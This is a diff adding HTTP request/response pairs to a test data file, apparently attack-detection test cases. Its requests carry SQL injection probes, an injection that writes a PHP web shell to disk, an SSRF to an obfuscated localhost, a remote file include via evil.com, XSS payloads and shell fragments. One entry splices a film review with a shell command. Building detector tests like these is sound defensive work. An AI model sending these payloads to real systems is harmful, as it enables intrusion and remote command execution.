@@ -2,3 +2,257 @@
 # This file is the white data for the test.
 # The request and response are surrounded by {{ and }}.
 #
+{{
+GET /?test=Cult%20purchasers%20are%20unquestionably%20familiar%20with%20the%20term%20%22video%20nasties%22.%20This%20was%20a%20notorious%20British%20list%20containing%20all%20the%20films%20that%20could%20bring%20%27damage%27%20to%20society%20if%20viewed%20by%20irresponsible%20audiences%20%28dramatization%29.%20For%20gore%20buffs%2C%20this%20is%20an%20excellent%20checklist%20as%20it%20contains%20inhumanly%20cruel%20and%20disturbingly%20realist%20movies%20%28Faces%20of%20Death%2C%20Cannibal%20Holocaust%2C%20Driller%20Killer%29%20as%20well%20as%20outrageous%20and%20ultra-sick%20horror%20films%20%28The%20Burning%2C%20Nightmare%20City%2C%20The%20Toolbox%20Murders%29.%20Keeping%20this%20in%20mind%2C%20it%27s%20quite%20unusual%20to%20see%20%22Night%20of%20the%20Bloody%20Apes%22%20listed%20among%20the%20other%20%22nasties%22.%20It%20sure%20is%20gory%C3%82%C2%85but%20the%20blood%20and%20violence%20are%20so%20poorly%20presented%20I%20can%27t%20imagine%20anyone%20would%20be%20offended%20by%20it.%20And%20the%20silly%20plot%20%28about%20a%20desperate%20doctor%20transplanting%20a%20gorilla%27s%20heart%20into%20the%20chest%20of%20his%20dying%20son%29%20isn%27t%20exactly%20what%20you%20would%20call%20disturbingly%20real%2C%20neither.%20All%20that%20remains%20is%20a%20fairly%20amusF5Mldd%20/bin/%2A%20/usr/bin/%2A%20%7C%20sed%20-e%20%27/%5E%5B%5E%5Ct%5D/%20d%3B%20s/%5E%5Ct%5C%28.%2A%20%3D%3E%20%5C%29%5C%3F%5C%28%5B%5E%20%5D%2A%5C%29%20%28.%2A/%5C2/g%27%20%7C%20sort%20%7C%20uniq%20-cbuHIUDbbSscqu5Z0tL5jpUMJated%20I%20can%27t%20imagin HTTP/1.1
+Host: cn.bing.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Content-Length: 11
+Set-Cookie: c1=v1;c2=v2
+Set-Cookie: c3=v4
+
+hello world
+}}
+
+{{
+GET /rates/index.php?page=step1&proId=+'UNION+SELECT+"<?php+echo+shell_exec($_GET['ohno']);?>","","","","","","","","","","","","","","","",""+"INTO+OUTFILE+'/var/www/html/rates/admin/DBbackup/youcantfindme.php'--+- HTTP/1.1
+Host: <target_IP>
+User-Agent: Mozilla/5.0
+Connection: keep-alive
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Content-Length: 11
+Set-Cookie: c1=v1;c2=v2
+Set-Cookie: c3=v4
+
+hello world
+}}
+
+{{
+GET /get?ssrf=ssh://0177.00.00.01 HTTP/1.1
+user-agent: Mozilla/5.0 (X11; U; Linux i686; pl; rv:1.8.0.12) Gecko/20070508 Firefox/1.5.0.12
+accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+accept-encoding: gzip,deflate
+accept-language: en-us,en;q=0.5
+x-forwarded-for: 10.255.255.254
+x-forwarded-proto: http
+x-request-id: c4a7566a-d786-4444-94b1-63e9d300355d
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Content-Length: 11
+Set-Cookie: c1=v1;c2=v2
+Set-Cookie: c3=v4
+
+hello world
+}}
+
+{{
+GET /?test=php%3A//filter/read%3Dstring.rot13/resource%3Dhttp%3A//evil.com/index.php%26parm2%3Dfdna9rkif2ndfkigfji89rkfj29rk0hg3j98yhfile%3Dlogin.php HTTP/1.1
+Host: cn.bing.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Content-Length: 11
+Set-Cookie: c1=v1;c2=v2
+Set-Cookie: c3=v4
+
+hello world
+}}
+
+{{
+GET /?test=-2489%29%20AS%20mxnC%20WHERE%203414%3D3414%20ORDER%20BY%201--%20gsqA HTTP/1.1
+Host: cn.bing.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Content-Length: 11
+Set-Cookie: c1=v1;c2=v2
+Set-Cookie: c3=v4
+
+hello world
+}}
+
+{{
+GET /?test=%27%20IN%20BOOLEAN%20MODE%29%20AND%207453%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20AS%20sys2%2Csysusers%20AS%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29%23 HTTP/1.1
+Host: cn.bing.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Content-Length: 11
+Set-Cookie: c1=v1;c2=v2
+Set-Cookie: c3=v4
+
+hello world
+}}
+
+{{
+GET /?test=-2321%22%20OR%20%28SELECT%20%28CASE%20WHEN%20%285362%3D5362%29%20THEN%20NULL%20ELSE%20CAST%28%28CHR%28106%29%7C%7CCHR%28110%29%7C%7CCHR%28112%29%7C%7CCHR%2875%29%29%20AS%20NUMERIC%29%20END%29%29%20IS%20NULL%20AND%20%22sygy%22%20LIKE%20%22sygy HTTP/1.1
+Host: cn.bing.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Content-Length: 11
+Set-Cookie: c1=v1;c2=v2
+Set-Cookie: c3=v4
+
+hello world
+}}
+
+{{
+GET /?test=8713%26amp%3Bsubval%3Dspecial_offers_xtr013%26amp%3Bdurl%3D%26quot%3B%26gt%3B%26lt%3Bscript%26gt%3Balert%28%26quot%3Bfugi%3Cbr%3Etif%26quot%3B%29%26lt%3B/script%26gt%3B HTTP/1.1
+Host: cn.bing.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Content-Length: 11
+Set-Cookie: c1=v1;c2=v2
+Set-Cookie: c3=v4
+
+hello world
+}}
+
+{{
+GET /?test=%22%2B%27%3E%3Cscript%3Ealert%281%29%3C/script%3E HTTP/1.1
+Host: cn.bing.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Content-Length: 11
+Set-Cookie: c1=v1;c2=v2
+Set-Cookie: c3=v4
+
+hello world
+}}
+
+{{
+GET /?test=xxx%3Ax%20onerror%3Djavascript%3Aalert%281%29%3E HTTP/1.1
+Host: cn.bing.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Content-Length: 11
+Set-Cookie: c1=v1;c2=v2
+Set-Cookie: c3=v4
+
+hello world
+}}
+
+{{
+GET /?test=%3Caddress%20onmousemove%3D%22alert%281%29%22%3Etest%3C/address%3E HTTP/1.1
+Host: cn.bing.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Content-Length: 11
+Set-Cookie: c1=v1;c2=v2
+Set-Cookie: c3=v4
+
+hello world
+}}
+
+{{
+GET /?test=unset%20%24%28echo%20%22%24a%22%20%7C%20/usr/bin/cut%20-d%20%3D%20-f%201%29 HTTP/1.1
+Host: cn.bing.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Content-Length: 11
+Set-Cookie: c1=v1;c2=v2
+Set-Cookie: c3=v4
+
+hello world
+}}
+
+{{
+GET /?test=select%20case%20when%201892%20%20%3D%20%203646%20then%201%20else%20null%20end-- HTTP/1.1
+Host: cn.bing.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Content-Length: 11
+Set-Cookie: c1=v1;c2=v2
+Set-Cookie: c3=v4
+
+hello world
+}}
+
+{{
+GET /?test=1%22%20%20%29%20%20%29%20%20%20and%20elt%20%28%203785%20%3D%209386%2C9386%20%29%20%20and%20%20%20%28%20%20%28%20%20%22inwa%22%20like%20%22inwa HTTP/1.1
+Host: cn.bing.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Content-Length: 11
+Set-Cookie: c1=v1;c2=v2
+Set-Cookie: c3=v4
+
+hello world
+}}
+
+{{
+GET /?test=-9103%27%20or%204493%20%20%3D%20%20utl_inaddr.get_host_address%20%20%28%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%204493%20%20%3D%20%204493%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%27nlvq%27%20%20%3D%20%20%27nlvq HTTP/1.1
+Host: cn.bing.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Content-Length: 11
+Set-Cookie: c1=v1;c2=v2
+Set-Cookie: c3=v4
+
+hello world
+}}
